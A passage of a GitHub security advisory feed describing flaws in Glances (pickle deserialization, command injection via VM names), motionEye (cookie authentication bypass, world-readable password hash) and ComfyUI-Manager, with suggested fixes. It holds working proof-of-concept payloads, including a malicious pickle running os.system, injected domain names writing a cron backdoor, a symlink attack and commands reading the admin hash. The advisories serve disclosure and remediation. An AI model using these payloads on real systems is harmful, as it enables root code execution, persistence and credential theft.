ln -s /tmp/attacker_controlled /home/john/.cache/glances
</code></pre>
<p>When Glances writes its legitimate cache file it writes instead to <code>/tmp/attacker_controlled/glances-version.db</code>, which the attacker can replace with the malicious pickle before the next start.</p>
<hr>
<p><strong>Minimal self-contained reproduction</strong></p>
<pre><code class="language-python">import sys, os, pickle, pathlib, argparse

sys.path.insert(0, '/path/to/glances')   # adjust to local clone

FAKE_CACHE = pathlib.Path('/tmp/glances_test_cache')
CACHE_FILE = FAKE_CACHE / 'glances-version.db'
FAKE_CACHE.mkdir(parents=True, exist_ok=True)

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo RCE_confirmed &gt;&gt; /tmp/glances_rce.txt',))

CACHE_FILE.write_bytes(pickle.dumps(Exploit()))

# Reproduce the exact Glances code path
from glances.outdated import Outdated
obj = object.__new__(Outdated)
obj.args = argparse.Namespace(disable_check_update=False, time=2)
obj.data = {}
obj.cache_file = str(CACHE_FILE)

try:
    obj._load_cache()            # pickle.load() fires here
except Exception:
    pass                         # expected: int not subscriptable

import time; time.sleep(0.2)
print(pathlib.Path('/tmp/glances_rce.txt').read_text())
# Prints: RCE_confirmed
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> Insecure Deserialization (CWE-502)</p>
<p><strong>Who is impacted:</strong> Any system where Glances is run with version checking enabled (the default) in a shared environment where a less-privileged process can write to the Glances user's XDG cache directory, or in any containerised deployment using shared volumes.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> Full — the attacker gains code execution in the context of the Glances process and can read any data accessible to that user.</li>
<li><strong>Integrity:</strong> Full — arbitrary commands can modify files, install persistence mechanisms, or alter system state.</li>
<li><strong>Availability:</strong> Full — the Glances process and, if running as root, the system can be disrupted.</li>
</ul>
<p>On many deployments Glances is run as root (required to access hardware performance counters without specific capabilities), meaning successful exploitation yields full root code execution without any further privilege escalation step.</p>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Replace <code>pickle</code> with <code>json</code> for the version cache.  The data stored is a simple Python dictionary containing two string values and a <code>datetime</code> object; a JSON representation is straightforward:</p>
<pre><code class="language-python">import json
from datetime import datetime

# Saving
with open(self.cache_file, 'w', encoding='utf-8') as f:
    json.dump({
        'installed_version': self.installed_version(),
        'latest_version':    latest,
        'refresh_date':      datetime.now().isoformat(),
    }, f)

# Loading
with open(self.cache_file, 'r', encoding='utf-8') as f:
    cached_data = json.load(f)
    cached_data['refresh_date'] = datetime.fromisoformat(cached_data['refresh_date'])
</code></pre>
<p>If pickle is retained for any reason, the cache file must be protected with an HMAC keyed from a Glances-managed secret (e.g. a random key stored in the Glances config directory, which should itself be mode 0600).</p>
<p>As an additional hardening measure, restrict the permissions of the Glances cache directory to 0700 at creation time.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
<hr>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j">https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-9837-48hr-q32j">https://github.com/advisories/GHSA-9837-48hr-q32j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9837-48hr-q32j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T21:21:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances is Vulnerable to Command Injection via KVM/QEMU VM Domain Names in glances/plugins/vms/engines/virsh.py]]></title>
        <id>https://github.com/advisories/GHSA-v5r2-qh84-fjx5</id>
        <link href="https://github.com/advisories/GHSA-v5r2-qh84-fjx5"/>
        <updated>2026-06-22T21:14:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances KVM/QEMU monitoring engine (<code>glances/plugins/vms/engines/virsh.py</code>) passes VM domain names, read directly from <code>virsh list --all</code> output, into f-string command templates that are processed by <code>secure_popen()</code>. <code>secure_popen()</code> is explicitly designed to interpret <code>&amp;&amp;</code>, <code>|</code>, and <code>&gt;</code> as shell operators.  Because domain names are never sanitised before interpolation, any user with the ability to create or rename a KVM/QEMU virtual machine can execute arbitrary commands as the OS user running Glances — commonly root on hypervisor hosts.</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected file:</strong> <code>glances/plugins/vms/engines/virsh.py</code></p>
<p><strong>Direct URLs (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L185">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L185</a></li>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L204">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L204</a></li>
</ul>
<p>The vulnerable calls are on lines 185 and 204:</p>
<pre><code class="language-python"># line 185  (update_stats)
ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_STATS_OPTIONS} {domain}')

# line 204  (update_title)
ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_TITLE_OPTIONS} {domain}')
</code></pre>
<p><code>domain</code> is the name string parsed from the output of <code>virsh list --all</code> (line 59–78 in the same file); no sanitisation is applied to it at  any point before it reaches <code>secure_popen()</code>.</p>
<p><code>secure_popen()</code> is defined in <code>glances/secure.py</code>.  It explicitly splits the command string on <code>&amp;&amp;</code>, <code>|</code>, and <code>&gt;</code> before invoking <code>subprocess.Popen</code> with <code>shell=False</code> on each part, meaning all three operators are treated as real pipeline/redirection control characters:</p>
<pre><code class="language-python"># glances/secure.py
def secure_popen(cmd):
    ret = ''
    for c in cmd.split('&amp;&amp;'):        # '&amp;&amp;' → two separate processes
        ret += __secure_popen(c)
    return ret

def __secure_popen(cmd):
    for sub_cmd in cmd.split('|'):   # '|' → stdin/stdout piped
        p = Popen(sub_cmd_split, shell=False, stdin=sub_cmd_stdin, stdout=PIPE, stderr=PIPE)
    # '&gt;' is split separately for file redirection
</code></pre>
<p>By contrast, <code>actions.py</code> sanitises process names through <code>_sanitize_mustache_dict()</code> before they reach <code>secure_popen()</code>.  The <code>vms</code> plugin applies no such protection.</p>
<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
<p>All three injection operators were verified:</p>
<table>
<thead>
<tr>
<th>Operator</th>
<th>Effect</th>
<th>Confirmed</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;&amp;</code></td>
<td>Second command executes after the virsh call</td>
<td>Yes</td>
</tr>
<tr>
<td><code>|</code></td>
<td>Output of virsh piped to injected command</td>
<td>Yes</td>
</tr>
<tr>
<td><code>&gt;</code></td>
<td>virsh output redirected to arbitrary file</td>
<td>Yes</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Special configuration required</strong></p>
<ul>
<li>Glances must be configured to monitor a KVM/QEMU hypervisor: the <code>vms</code> plugin must be enabled and <code>/usr/bin/virsh</code> must be installed and executable.</li>
<li>The attacker must have libvirt domain-creation or domain-rename privileges (e.g. membership in the <code>libvirt</code> group, a typical default on  Ubuntu/Debian/Fedora, or a cloud-platform tenant account).</li>
<li>No custom <code>glances.conf</code> settings are needed beyond a working virsh setup.</li>
</ul>
<p><strong>Step 1 — Create a VM with a crafted domain name</strong></p>
<p>Using the <code>&amp;&amp;</code> operator to chain a second command:</p>
<pre><code class="language-xml">&lt;domain type="kvm"&gt;
  &lt;name&gt;productionDB &amp;amp;&amp;amp; touch /tmp/glances_pwned&lt;/name&gt;
  &lt;memory&gt;131072&lt;/memory&gt;
  &lt;vcpu&gt;1&lt;/vcpu&gt;
  &lt;os&gt;&lt;type arch="x86_64"&gt;hvm&lt;/type&gt;&lt;/os&gt;
&lt;/domain&gt;
</code></pre>
<pre><code class="language-bash">virsh define evil-domain.xml
</code></pre>
<p><strong>Step 2 — Start Glances with KVM monitoring enabled</strong></p>
<pre><code class="language-bash">glances                # or: glances -s / glances -w
</code></pre>
<p>On the next monitoring cycle Glances calls:</p>
<pre><code>virsh domstats --nowait "productionDB &amp;&amp; touch /tmp/glances_pwned"
</code></pre>
<p>which <code>secure_popen()</code> splits into two processes:</p>
<ol>
<li><code>virsh domstats --nowait productionDB</code></li>
<li><code>touch /tmp/glances_pwned</code></li>
</ol>
<p><strong>Step 3 — Verify execution</strong></p>
<pre><code class="language-bash">ls -la /tmp/glances_pwned   # file will exist, owned by the Glances user
</code></pre>
<p><strong>Pipe injection (<code>|</code>) example</strong></p>
<p>Domain name: <code>"productionDB | tee /tmp/virsh_output_stolen.txt"</code></p>
<p>The output of the virsh call is piped to <code>tee</code>, writing the data to an attacker-controlled path.</p>
<p><strong>File-write injection (<code>&gt;</code>) example</strong></p>
<p>Domain name: <code>"productionDB &gt; /etc/cron.d/glances_backdoor"</code></p>
<p>The virsh output is redirected to a cron file, enabling persistent code execution on the next cron cycle.</p>
<p><strong>Minimal Python reproduction (no VM required)</strong></p>
<pre><code class="language-python">import sys
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
from glances.secure import secure_popen

# Simulates the exact call in virsh.py line 185
domain = 'productionDB &amp;&amp; id'
result = secure_popen(f'/bin/echo domstats --nowait {domain}')
print(result)
# Output will include two lines: the echo output AND the output of `id`
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> Command Injection (CWE-78)</p>
<p><strong>Who is impacted:</strong> Any deployment of Glances on a KVM/QEMU hypervisor host where the <code>vms</code> plugin is active.  Exploitation requires the attacker to have libvirt domain-creation or domain-rename rights — a privilege granted by default to members of the <code>libvirt</code> group and to cloud-platform tenant APIs.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> Full — arbitrary commands can exfiltrate secrets from the Glances process environment and the file system.</li>
<li><strong>Integrity:</strong> Full — file-write injection (<code>&gt;</code>) allows placing content in any file writable by the Glances process (cron, authorised_keys, etc.).</li>
<li><strong>Availability:</strong> Full — the Glances process can be terminated or the host disrupted through the injected commands.</li>
</ul>
<p>In cloud and multi-tenant virtualisation environments, Glances commonly runs as root on the hypervisor to access performance counters, so successful exploitation typically yields root-level code execution.</p>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Replace the f-string interpolation with list-based argument passing to avoid any interaction with <code>secure_popen()</code>'s operator splitting logic:</p>
<pre><code class="language-python"># virsh.py — replace lines 185 and 204 with subprocess.run and explicit arg list from subprocess import run, PIPE

result = run(
    [VIRSH_PATH, 'domstats', '--nowait', domain],
    stdout=PIPE, stderr=PIPE, timeout=5
)
</code></pre>
<p>Alternatively, sanitise <code>domain</code> using the same <code>_sanitize_mustache_dict</code> helper already used in <code>actions.py</code>, which strips <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;</code>, <code>;</code>, and backtick characters from string values.</p>
<p>As a defence-in-depth measure, consider running Glances under a dedicated low-privilege service account with <code>CAP_SYS_PTRACE</code> rather than as root.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
<hr>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members
of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-v5r2-qh84-fjx5">https://github.com/nicolargo/glances/security/advisories/GHSA-v5r2-qh84-fjx5</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-v5r2-qh84-fjx5">https://github.com/advisories/GHSA-v5r2-qh84-fjx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5r2-qh84-fjx5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T21:14:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye: Authentication possible via password hash]]></title>
        <id>https://github.com/advisories/GHSA-r3cw-c95m-wfh9</id>
        <link href="https://github.com/advisories/GHSA-r3cw-c95m-wfh9"/>
        <updated>2026-06-22T20:59:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authentication bypass vulnerability exists due to improper trust in client-controlled cookies. The application accepts user-supplied cookie values containing a username and password-hash-derived value as sufficient authentication material. These cookies can be set or modified prior to login, allowing an unauthenticated attacker to impersonate arbitrary users without knowledge of the plaintext password. This issue stems from the absence of server-side validation of authentication state and reliance on attacker-controlled cookie data</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because the application accepts the client-supplied cookies named <code>meye_password_hash</code> and <code>meye_username</code> as sufficient authentication material. The server does not validate these values against a server-side session or enforce proper authentication checks before establishing an authenticated state. As a result, an unauthenticated attacker can set or modify these cookies to impersonate another user if the target username and corresponding hash are known.</p>
<p>These cookies normally appear after using the "switch user" functionality; however, they can be added manually prior to authentication using standard browser tools (e.g., developer tools or cookie editors) or dynamically loaded by submitting blank credentials. When supplied, the server accepts them and authenticates the attacker as the specified user bypassing the intended authentication flow</p>
<p>Additionally, the password-hash value and username for the admin account used by the application is stored in <code>/etc/motioneye/motion.conf</code> which is globally readable by default on the local system. This means any local user with shell access can obtain a valid hash and values and use them to impersonate the admin via the cookie manipulation described above. While local access is required to retrieve the hash, this significantly lowers the barrier to exploitation in multi-user environments. </p>
<h3 id="poc">PoC</h3>
<p>Starting state unauthenticated with no cookies:
<img width="644" height="475" alt="start state" src="https://github.com/user-attachments/assets/cf4aff78-65f7-4f67-99e2-9134c8f04277"></p>
<p>After manually adding or submitting blank credentials to get the cookies loaded:
<img width="643" height="470" alt="empty cookies" src="https://github.com/user-attachments/assets/223878eb-f085-4ac5-a92a-2ac21831c594"></p>
<p>Adding the credentials and refreshing the page gives us a valid session:
<img width="641" height="466" alt="admin login with hash" src="https://github.com/user-attachments/assets/94b350ef-dd32-4cae-8bd8-e48841873f79"></p>
<p>version information and session interaction validation
<img width="643" height="468" alt="verison" src="https://github.com/user-attachments/assets/94290ad6-4e82-4026-8e27-5374e2f3a631"></p>
<h3 id="impact">Impact</h3>
<p>Authentication bypass</p>
<h3 id="who-is-impacted">Who is impacted?</h3>
<p>Any MotionEye deployment where attackers have access to a username and hash, and/or the <code>/etc/motioneye/motion.conf</code> file with the admin username and hash.</p>
<p>Potential consequences:</p>
<ul>
<li>Account lockouts </li>
<li>Attacker persistence by changing the password</li>
<li>Enumeration of data</li>
<li>Destruction of data</li>
<li>Exfiltration of data</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-r3cw-c95m-wfh9">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-r3cw-c95m-wfh9</a></li>
<li><a href="https://github.com/advisories/GHSA-r3cw-c95m-wfh9">https://github.com/advisories/GHSA-r3cw-c95m-wfh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3cw-c95m-wfh9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-22T20:59:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[comfyui-manager] ComfyUI-Manager has an Unprotected Alternate Channel (CWE-420)]]></title>
        <id>https://github.com/advisories/GHSA-95pq-hr8p-f5g7</id>
        <link href="https://github.com/advisories/GHSA-95pq-hr8p-f5g7"/>
        <updated>2026-06-22T19:58:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An <strong>Unprotected Alternate Channel (CWE-420)</strong> vulnerability was discovered in ComfyUI-Manager versions prior to 3.38.</p>
<h4 id="vulnerability-details">Vulnerability Details</h4>
<p>In affected versions, ComfyUI-Manager stored its configuration in the <code>user/default/ComfyUI-Manager/</code> directory, which was accessible via ComfyUI's web APIs without proper access control. This unprotected alternate channel allowed remote attackers to read and manipulate configuration files and critical data through the web interface.</p>
<h4 id="potential-attack-scenarios">Potential Attack Scenarios</h4>
<p>An attacker exploiting this vulnerability could:</p>
<ul>
<li><strong>Modify security settings</strong>: Lower the security level from "strong" to "weak" to enable more dangerous operations</li>
<li><strong>Tamper with custom node sources</strong>: Add malicious custom node repositories</li>
<li><strong>Manipulate snapshot data</strong>: Corrupt or alter system snapshots</li>
<li><strong>Change manager behavior</strong>: Alter various manager configuration settings</li>
</ul>
<h4 id="affected-configurations">Affected Configurations</h4>
<table>
<thead>
<tr>
<th>Configuration</th>
<th>Risk Level</th>
</tr>
</thead>
<tbody><tr>
<td>Systems running with <code>--listen 0.0.0.0</code> (externally exposed)</td>
<td><strong>HIGH</strong></td>
</tr>
<tr>
<td>Systems behind reverse proxy without proper access control</td>
<td><strong>MEDIUM</strong></td>
</tr>
<tr>
<td>Local-only installations (default, localhost only)</td>
<td><strong>NOT AFFECTED</strong></td>
</tr>
</tbody></table>
<hr>
<h3 id="patches">Patches</h3>
<p>This issue has been patched in <strong>ComfyUI-Manager version 3.38</strong>.</p>
<h4 id="requirements">Requirements</h4>
<table>
<thead>
<tr>
<th>Component</th>
<th>Minimum Version</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td>ComfyUI</td>
<td>v0.3.76+</td>
<td>Required for System User Protection API</td>
</tr>
<tr>
<td>ComfyUI-Manager</td>
<td>v3.38+</td>
<td>Contains the security fix</td>
</tr>
</tbody></table>
<h4 id="what-the-patch-does">What the Patch Does</h4>
<ol>
<li><strong>Path Migration</strong>: Configuration files moved from unprotected <code>user/default/ComfyUI-Manager/</code> to protected <code>user/__manager/</code></li>
<li><strong>Protected Directory</strong>: The new <code>__manager/</code> directory leverages ComfyUI's System User Protection API, which blocks external web API access</li>
<li><strong>Security Level Enforcement</strong>: Settings below "normal" are automatically raised to "normal" during migration</li>
<li><strong>Legacy Backup</strong>: Old data is backed up to <code>.legacy-manager-backup/</code> with startup reminders until manually deleted</li>
<li><strong>Fallback Protection</strong>: If ComfyUI &lt; v0.3.76, Manager forces "strong" security mode, blocking new installations until ComfyUI is updated</li>
</ol>
<h4 id="patch-details">Patch Details</h4>
<ul>
<li><strong>Commit</strong>: <code>aaed1dc</code></li>
<li><strong>Pull Request</strong>: <a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338">ComfyUI-Manager/#2338</a> <a href="https://github.com/Comfy-Org/ComfyUI/pull/10966">ComfyUI/#10966</a></li>
<li><strong>Changes</strong>: +780 lines, −61 lines across 13 files</li>
</ul>
<hr>
<h3 id="workarounds">Workarounds</h3>
<p>If immediate upgrade is not possible, apply the following mitigations:</p>
<table>
<thead>
<tr>
<th>Mitigation</th>
<th>Effectiveness</th>
<th>Effort</th>
</tr>
</thead>
<tbody><tr>
<td>Remove <code>--listen 0.0.0.0</code> flag (use localhost only)</td>
<td><strong>HIGH</strong></td>
<td>Low</td>
</tr>
<tr>
<td>Implement firewall rules to block external access to ComfyUI ports</td>
<td><strong>HIGH</strong></td>
<td>Medium</td>
</tr>
<tr>
<td>Use reverse proxy with authentication (e.g., nginx + basic auth)</td>
<td><strong>HIGH</strong></td>
<td>Medium</td>
</tr>
<tr>
<td>Restrict network access to trusted IPs only</td>
<td><strong>MEDIUM</strong></td>
<td>Low</td>
</tr>
</tbody></table>
<p><strong>Note</strong>: These are temporary mitigations. Upgrading to v3.38+ is strongly recommended.</p>
<hr>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-67303">NVD - CVE-2025-67303</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">ComfyUI-Manager v3.38 Security Migration Guide</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338">Patch Pull Request ComfyUI-Manager/#2338</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI/pull/10966">Patch Pull Request ComfyUI/#10966</a></li>
</ul>
<hr>
<h3 id="credit">Credit</h3>
<p>This vulnerability was reported by <strong>Ricter Zheng (ricterzheng / 郑杜涛)</strong> from <strong>Tencent Xuanwu Lab</strong> <a href="mailto:ricterzheng@tencent.com">ricterzheng@tencent.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-95pq-hr8p-f5g7">https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-95pq-hr8p-f5g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-67303">https://nvd.nist.gov/vuln/detail/CVE-2025-67303</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26">https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md</a></li>
<li><a href="https://github.com/advisories/GHSA-95pq-hr8p-f5g7">https://github.com/advisories/GHSA-95pq-hr8p-f5g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-95pq-hr8p-f5g7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T19:58:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[comfyui-manager] Duplicate Advisory: ComfyUI-Manager has an Unprotected Alternate Channel (CWE-420)]]></title>
        <id>https://github.com/advisories/GHSA-2hc9-cc65-xwj8</id>
        <link href="https://github.com/advisories/GHSA-2hc9-cc65-xwj8"/>
        <updated>2026-06-22T19:58:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-95pq-hr8p-f5g7. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>An issue in ComfyUI-Manager prior to version 3.38 allowed remote attackers to potentially manipulate its configuration and critical data. This was due to the application storing its files in an insufficiently protected location that was accessible via the web interface</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-67303">https://nvd.nist.gov/vuln/detail/CVE-2025-67303</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26">https://github.com/Comfy-Org/ComfyUI-Manager/pull/2338/commits/e44c5cef58fb4973670b86433b9d24d077b44a26</a></li>
<li><a href="https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md">https://github.com/Comfy-Org/ComfyUI-Manager/blob/main/docs/en/v3.38-userdata-security-migration.md</a></li>
<li><a href="https://github.com/advisories/GHSA-2hc9-cc65-xwj8">https://github.com/advisories/GHSA-2hc9-cc65-xwj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hc9-cc65-xwj8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-05T18:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[motioneye] motionEye's World-Readable Configuration File Exposes Admin Password Hash]]></title>
        <id>https://github.com/advisories/GHSA-rhgp-6wq6-9j67</id>
        <link href="https://github.com/advisories/GHSA-rhgp-6wq6-9j67"/>
        <updated>2026-06-22T17:11:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="security-advisory-world-readable-configuration-file-exposes-admin-password-hash-in-motioneye">Security Advisory: World-Readable Configuration File Exposes Admin Password Hash in motionEye</h1>
<h2 id="summary">Summary</h2>
<p>motionEye v0.43.1 and prior versions create the configuration file <code>/etc/motioneye/motion.conf</code> with <code>644</code> permissions (<code>-rw-r--r--</code>), making it readable by any local user on the system. This file contains sensitive data including the admin password hash, which can be leveraged by other vulnerabilities to escalate privileges.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li>motionEye &lt;= 0.43.1b4</li>
<li>Fixed in motionEye 0.44.0b1 (applies <code>0600</code> mode to <code>motion.conf</code> and <code>camera-*.conf</code> files)</li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="world-readable-configuration-file-cwe-732">World-Readable Configuration File (CWE-732)</h3>
<p>When motionEye writes its configuration, the file <code>/etc/motioneye/motion.conf</code> is created with <code>644</code> permissions regardless of the installation method. This file contains the admin password hash in the <code>@admin_password</code> field:</p>
<pre><code># @admin_username admin
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
<p>Any local user can read this hash without elevated privileges:</p>
<pre><code class="language-bash">$ sudo -u testuser cat /etc/motioneye/motion.conf
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
<p>Additionally, per-camera configuration files (<code>camera-*.conf</code>) are also created with the same <code>644</code> permissions, potentially exposing camera-specific credentials and settings.</p>
<h2 id="impact">Impact</h2>
<p>The exposed admin password hash enables several attack paths:</p>
<ul>
<li><strong>Offline password cracking:</strong> The SHA1 hash can be cracked to recover the plaintext admin password</li>
<li><strong>Authentication bypass:</strong> When combined with the signature authentication weakness (see GHSA-45h7-499j-7ww3), the hash can be used directly to forge authenticated admin API requests</li>
<li><strong>Full system compromise:</strong> When further chained with CVE-2025-60787 (OS command injection), a local unprivileged user can escalate to the Motion daemon user (often root)</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The following demonstrates that an unprivileged user can read the admin password hash from the config file and verify it matches the admin's password:</p>
<pre><code class="language-bash"># Verify the file permissions
$ ls -la /etc/motioneye/motion.conf
-rw-r--r-- 1 motion motion 255 Mar 11 15:42 /etc/motioneye/motion.conf

# Read the hash as an unprivileged user
$ sudo -u testuser cat /etc/motioneye/motion.conf | grep admin_password
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37

# Verify the hash matches the admin password (SHA1)
$ sudo -u testuser python3 -c "import hashlib; print(hashlib.sha1(b'testpassword123').hexdigest())"
c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
<h3 id="verified-output">Verified Output</h3>
<p>The following output was captured on a fresh motionEye v0.43.1b4 installation (official <code>motioneye_init</code> method, admin password set to <code>testpassword123</code>):</p>
<pre><code>$ ls -la /etc/motioneye/motion.conf
-rw-r--r-- 1 motion motion 255 Mar 11 15:42 /etc/motioneye/motion.conf

$ sudo -u testuser cat /etc/motioneye/motion.conf | grep admin_password
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37

$ sudo -u testuser python3 -c "import hashlib; print(hashlib.sha1(b'testpassword123').hexdigest())"
c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
<p>The hash extracted by the unprivileged <code>testuser</code> matches the SHA1 of the admin password, confirming full credential exposure.</p>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<p>This vulnerability has been tested and confirmed with both installation methods described in the official motionEye documentation.</p>
<h3 id="method-1-manual-installation">Method 1: Manual Installation</h3>
<ol>
<li><p>Install motionEye on a Linux system:</p>
<pre><code class="language-bash">sudo pip install motioneye
mkdir -p /etc/motioneye /var/log/motioneye /var/lib/motioneye /run/motioneye
cp /usr/local/lib/python3.12/dist-packages/motioneye/extra/motioneye.conf.sample /etc/motioneye/motioneye.conf
sudo meyectl startserver -c /etc/motioneye/motioneye.conf
</code></pre>
</li>
<li><p>Set an admin password via the web UI at <code>http://localhost:8765</code></p>
</li>
<li><p>Verify the config file is world-readable:</p>
<pre><code class="language-bash">ls -la /etc/motioneye/motion.conf
# -rw-r--r-- 1 root root 255 ... /etc/motioneye/motion.conf
</code></pre>
</li>
<li><p>As an unprivileged user, read the hash:</p>
<pre><code class="language-bash">sudo -u testuser cat /etc/motioneye/motion.conf
# @admin_password c18006fc138809314751cd1991f1e0b820fabd37
</code></pre>
</li>
</ol>
<h3 id="method-2-official-motioneye_init-installation">Method 2: Official <code>motioneye_init</code> Installation</h3>
<ol>
<li><p>Install motionEye using the official init script:</p>
<pre><code class="language-bash">sudo pip install motioneye
sudo motioneye_init
</code></pre>
</li>
<li><p>The <code>motioneye_init</code> script automatically creates the required directories, installs the systemd service, and starts motionEye. Set an admin password via the web UI at <code>http://localhost:8765</code></p>
</li>
<li><p>Verify the config file is still world-readable:</p>
<pre><code class="language-bash">ls -la /etc/motioneye/motion.conf
# -rw-r--r-- 1 motion motion 255 ... /etc/motioneye/motion.conf
</code></pre>
